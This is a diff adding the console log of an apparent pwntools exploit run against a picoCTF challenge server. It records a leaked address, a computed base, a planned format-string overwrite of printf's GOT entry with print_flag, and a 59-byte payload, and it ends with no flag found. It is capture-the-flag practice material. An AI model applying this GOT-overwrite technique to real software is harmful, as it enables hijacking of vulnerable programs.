@@ -1,0 +1,22 @@
+[x] Opening connection to shape-facility.picoctf.net on port 64633
+[x] Opening connection to shape-facility.picoctf.net on port 64633: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 64633: Done
+[*] Leak: b'0x622edf994413'
+[*] Base: 0x622edf993000
+[*] print_flag: 0x622edf994269
+[*] GOT printf: 0x622edf996fa0
+[*] Shorts to write: 0x4269, 0xdf99, 0x622e
+[*] Write order: [('0x4269', 6), ('0x622e', 8), ('0xdf99', 7)]
+[*] Payload size: 59 bytes
+[*] Sending 'exit' to trigger printf...
+[*] Waiting for flag...
+[x] Receiving all data
+[x] Receiving all data: 6B
+[x] Receiving all data: 28B
+[+] Receiving all data: Done (28B)
+[*] Closed connection to shape-facility.picoctf.net port 64633
+
+[*] Full Response:
+o.bThe Valley Disappears
+
+[!] No flag found in response
